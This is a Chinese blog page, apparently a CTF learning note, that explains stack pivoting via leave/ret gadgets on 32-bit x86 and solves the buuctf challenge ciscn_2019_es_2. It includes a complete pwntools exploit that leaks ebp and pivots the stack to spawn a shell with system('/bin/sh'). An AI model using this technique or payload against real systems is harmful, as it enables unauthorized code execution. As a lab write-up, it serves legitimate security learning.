@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"yw-by.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.17.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta property="og:type" content="article">
+<meta property="og:title" content="栈迁移原理与应用">
+<meta property="og:url" content="http://yw-by.github.io/yw/4180228739/index.html">
+<meta property="og:site_name" content="yw__y">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yw-by.github.io/yw/4180228739/5.jpg">
+<meta property="og:image" content="http://yw-by.github.io/yw/4180228739/1.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/4180228739/2.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/4180228739/3.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/4180228739/4.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/4180228739/5.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/4180228739/6.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/4180228739/7.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/4180228739/8.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/4180228739/ciscn_2019_es_2_1.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/4180228739/ciscn_2019_es_2_2.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/4180228739/ciscn_2019_es_2_3.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/4180228739/ciscn_2019_es_2_4.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/4180228739/ciscn_2019_es_2_5.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/4180228739/ciscn_2019_es_2_6.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/4180228739/ciscn_2019_es_2_7.png">
+<meta property="article:published_time" content="2023-08-24T11:55:12.000Z">
+<meta property="article:modified_time" content="2023-11-02T12:06:04.038Z">
+<meta property="article:author" content="yw-by">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yw-by.github.io/yw/4180228739/5.jpg">
+
+
+<link rel="canonical" href="http://yw-by.github.io/yw/4180228739/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://yw-by.github.io/yw/4180228739/","path":"yw/4180228739/","title":"栈迁移原理与应用"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>栈迁移原理与应用 | yw__y</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">yw__y</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">1.</span> <span class="nav-text">栈溢出</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">2.</span> <span class="nav-text">栈迁移是什么</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E8%BF%87%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">栈迁移过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80"><span class="nav-number">3.1.</span> <span class="nav-text">一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C"><span class="nav-number">3.2.</span> <span class="nav-text">二</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89"><span class="nav-number">3.3.</span> <span class="nav-text">三</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B"><span class="nav-number">3.4.</span> <span class="nav-text">四</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94"><span class="nav-number">3.5.</span> <span class="nav-text">五</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">4.</span> <span class="nav-text">例题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf-ciscn-2019-es-2"><span class="nav-number">5.</span> <span class="nav-text">buuctf_ciscn_2019_es_2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96"><span class="nav-number">5.1.</span> <span class="nav-text">查看保护和反汇编</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-number">5.2.</span> <span class="nav-text">解题过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">5.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yw-by"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">yw-by</p>
+  <div class="site-description" itemprop="description">每天早起一点，或许我能赶上他们</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yw-by.github.io/yw/4180228739/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="yw-by">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yw__y">
+      <meta itemprop="description" content="每天早起一点，或许我能赶上他们">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="栈迁移原理与应用 | yw__y">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          栈迁移原理与应用
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-08-24 19:55:12" itemprop="dateCreated datePublished" datetime="2023-08-24T19:55:12+08:00">2023-08-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-11-02 20:06:04" itemprop="dateModified" datetime="2023-11-02T20:06:04+08:00">2023-11-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/PWN/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><img src="/yw/4180228739/5.jpg" class>
+
+<span id="more"></span>
+
+<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>（stackoverflow）</p>
+<p>当外界输入过长时，将超过局部变量（数组之类）的范围，造成数据溢出，覆盖了返回地址</p>
+<p>栈溢出能使我们覆盖栈上的某些区域的值，甚至是当前函数的返回地址ret，覆盖了ret为一个合法的地址，就有可能实现攻击者想要执行的命令。</p>
+<h1 id="栈迁移是什么"><a href="#栈迁移是什么" class="headerlink" title="栈迁移是什么"></a>栈迁移是什么</h1><p>要想完成栈溢出攻击，需要输入足够长，足以完成恶意指令的写入。有些情况下，输入长度受限制，填满缓冲区之后仅能容纳一个ret和一个ebp。</p>
+<img src="/yw/4180228739/1.png" class>
+
+<p>pop eip不合法（正常应该是：pop eax ，jmp eax，不用一定是eax），后面不再说，画流程图的时候没注意到，翻回去修改图上丢了很多东西，不重写了。</p>
+<p>如图所示，当上层函数调用foo函数，即eip执行到call foo指令时，call指令以及foo函数开始的指令依次做了如下事情：</p>
+<ul>
+<li>牢记foo结束后应该从哪里继续执行（保存当前eip下面的位置到栈中，即ret）</li>
+<li>牢记上层函数的栈底位置（保存当前ebp的内容到栈中，即old ebp）；</li>
+<li>牢记foo函数栈开始的位置（保存当前栈顶内容到ebp，便于foo函数栈内寻址）</li>
+</ul>
+<p>以上三件事对应了上图右侧上两个方框中的汇编指令，当call foo指令执行完后，栈中的内容如下图左，之后程序就由foo函数接管了。</p>
+<img src="/yw/4180228739/2.png" class>
+
+<p>当foo函数执行结束时，eip即将执行leave和ret两条指令恢复现场，此时栈中内容如上图右所示。leave与ret指令所作的事情：</p>
+<ul>
+<li>清空当前函数栈以还原栈空间（直接移动栈顶指针esp到当前函数的栈底而ebp）；</li>
+<li>还原栈底（将此时esp所指上层函数栈底old ebp弹入ebp寄存器中）；</li>
+<li>还原执行流（将此时esp所指的上层函数调用foo时的地址弹入eip寄存器内）；</li>
+</ul>
+<p>这三步恰好是之前的逆过程。</p>
+<p>在做回到调用者位置这件事时，栈顶指针的位置将完全由ebp寄存器的内容所控制(mov esp,ebp)，而ebp寄存器的内容则可以由栈中的数据控制(pop ebp)，由此，攻击者可以通过修改原old ebp内容，则能篡改ebp寄存器中的内容，从而（有可能）篡改esp进而控制eip。这一过程为栈迁移的思想。如下图</p>
+<img src="/yw/4180228739/3.png" class>
+
+<p>上文说（有可能），是因为leave所代表的子指令是有先后执行顺序的，即无法先执行pop ebp，再执行mov esp，ebp，无法先影响到ebp再影响esp。</p>
+<p>但是，将栈上的ret部分覆盖为另一组leave ret指令（gadget）的地址，即程序会执行两次leave指令，一次ret指令。就可以先修改ebp再影响esp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">第一次leave:</span><br><span class="line">mov esp,ebp;</span><br><span class="line">-&gt;pop ebp    ;&lt;-修改了ebp</span><br><span class="line">第一次ret：</span><br><span class="line">pop eip      ;&lt;-篡改了执行流执行下一次leave；ret</span><br><span class="line">第二次leave：</span><br><span class="line">-&gt;mov esp,ebp;&lt;-影响了esp</span><br><span class="line">pop ebp    ;</span><br><span class="line">一次ret：</span><br><span class="line">-&gt;pop eip    ;&lt;-影响了eip</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="栈迁移过程"><a href="#栈迁移过程" class="headerlink" title="栈迁移过程"></a>栈迁移过程</h1><h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>确定缓冲区变量在溢出时，至少能覆盖栈上的的ebp和ret。之后选取一段能执行提权的地址。</p>
+<p>就像之前做过的题目设置是复制输入内容到bss段，然后payload就可以写shellcode再将返回地址覆盖为这个地址。</p>
+<p>还是图解说的明白</p>
+<img src="/yw/4180228739/4.png" class>
+
+<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>寻找gadget（leava ret ）地址，记该地址为LeaveRetAddr</p>
+<h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><p>设置缓冲区变量，使其将栈上的ebp覆盖为HijackAddr-4，将ret覆盖为LeaveRetAddr</p>
+<h2 id="四"><a href="#四" class="headerlink" title="四"></a>四</h2><p>执行程序至结束，会发生以下事情</p>
+<ol>
+<li>执行指令：mov esp,ebp还原栈顶指针到当前栈底；此时esp指向栈上被篡改的ebp数据，即HijackAddr-4；<img src="/yw/4180228739/5.png" class></li>
+<li>执行指令：pop ebp，将篡改的HijackAddr-4放入ebp寄存器内，此时esp上移，指向栈上被篡改的ret数据</li>
+</ol>
+<img src="/yw/4180228739/6.png" class>
+
+<ol start="3">
+<li>执行指令： pop eip，将LeaveRetAddr放入eip寄存器内，篡改执行流，来执行第二次leave指令；</li>
+<li>执行指令：mov esp，ebp，将HijackAddr-4移入esp寄存器内，即栈顶指针被骗到指向HijackAddr-4</li>
+</ol>
+<img src="/yw/4180228739/7.png" class>
+
+<ol start="5">
+<li>执行指令：pop ebp ，ebp寄存器仍为HijackAddr-4，但esp上移四字节。指向HijackAddr</li>
+</ol>
+<img src="/yw/4180228739/8.png" class>
+
+<ol start="6">
+<li>执行指令pop eip，将HijackAddr移入eip内，成功篡改执行流至shellcode区域</li>
+</ol>
+<h2 id="五"><a href="#五" class="headerlink" title="五"></a>五</h2><p>执行shellcode，完成攻击</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h1 id="buuctf-ciscn-2019-es-2"><a href="#buuctf-ciscn-2019-es-2" class="headerlink" title="buuctf_ciscn_2019_es_2"></a>buuctf_ciscn_2019_es_2</h1><h2 id="查看保护和反汇编"><a href="#查看保护和反汇编" class="headerlink" title="查看保护和反汇编"></a>查看保护和反汇编</h2><p>checksec</p>
+<img src="/yw/4180228739/ciscn_2019_es_2_1.png" class>
+<p>32位堆栈不可执行<br>ida<br>main函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>vul函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>两次read可以输入<br>虽然有溢出但是余出的长度只有八字节。<br>在hack中有system函数，但是只是简单的输出flag字符串</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hack</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果能将&#x2F;bin&#x2F;sh作为参数调用system函数就能getshell了<br>这道题用栈迁移来解</p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>寻找gadget（leave_ret）</p>
+<img src="/yw/4180228739/ciscn_2019_es_2_2.png" class>
+<p>leave_ret_addr&#x3D;0x080484b8<br>第一次read(我的意思是输入)用来泄露ebp的地址<br>printf当遇到\x00时才会停止输出，将下一处的终止符覆盖就可以打印出ebp的地址，就像覆盖泄露canary一样来泄露ebp的地址<br>还要说的是，栈也是有地址的，后面用gdb的时候会说哪里是栈的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">paylaod1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">io.send(paylaod1)<span class="comment">#不能用sendline，会多输入一个&#x27;\n&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">ebp_addr=u32(io.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
+
+<p>现在我们要确定s在栈上的位置，好在第二次read时对栈进行布局。<br>选择的是用ebp+偏移量的方法来表示s的地址<br>gdb调试<br>从其他师傅处得来的经验，选择在nop处下断点</p>
+<img src="/yw/4180228739/ciscn_2019_es_2_3.png" class>
+<p>上面的是ida的，当然也没有忘记gdb怎么用，也挺好用的</p>
+<img src="/yw/4180228739/ciscn_2019_es_2_4.png" class>
+
+<p>总之断点地址：0x080485fc<br>下断点后运行（r），第一次read时输入aaaa，终止（ctrl+c），查看栈（stack）</p>
+<img src="/yw/4180228739/ciscn_2019_es_2_5.png" class>
+
+<p>所说数据存储在栈上，栈也是有地址的，这个地址指向的才是数据，也有栈指向一个地址，这个地址指向数据的。<br>上图左侧黄颜色的就是栈的地址<br>计算s到ebp的偏移量</p>
+<img src="/yw/4180228739/ciscn_2019_es_2_6.png" class>
+<p>0x38字节，所以s地址：ebp-0x38<br>第二次paylaod的布局图（0x10&#x3D;16）</p>
+<img src="/yw/4180228739/ciscn_2019_es_2_7.png" class>
+<p>payload2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">leave_ret_addr=<span class="number">0x080484b8</span></span><br><span class="line">system_addr=<span class="number">0x08048400</span></span><br><span class="line">bin_sh_addr=ebp-<span class="number">0x38</span>+<span class="number">0x10</span></span><br><span class="line">payload2=(<span class="string">b&#x27;aaaa&#x27;</span>+p32(system_addr)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(bin_sh_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p32(ebp-<span class="number">0x38</span>)+p32(leave_ret_addr)</span><br><span class="line"><span class="comment">#对于上面system后的aaaa，注意32位程序调用函数的顺序（参数、返回地址、函数）</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29270</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./ciscn_2019_es_2&#x27;)</span></span><br><span class="line">leave_ret_addr=<span class="number">0x080484b8</span></span><br><span class="line">system_addr=<span class="number">0x08048400</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name?\n&#x27;</span>)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">ebp_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line"><span class="comment">#s=ebp_addr-0x38</span></span><br><span class="line">bin_sh_addr=ebp_addr-<span class="number">0x38</span>+<span class="number">0x10</span></span><br><span class="line">payload2=(<span class="string">b&#x27;aaaa&#x27;</span>+p32(system_addr)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(bin_sh_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p32(ebp_addr-<span class="number">0x38</span>)+p32(leave_ret_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>看文章要慢</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>yw-by
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://yw-by.github.io/yw/4180228739/" title="栈迁移原理与应用">http://yw-by.github.io/yw/4180228739/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/yw/259342972/" rel="prev" title="暑期刷题">
+                  <i class="fa fa-chevron-left"></i> 暑期刷题
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/yw/684072015/" rel="next" title="C++面向对象高级开发">
+                  C++面向对象高级开发 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">yw-by</span>
+  </div>
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+-->
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
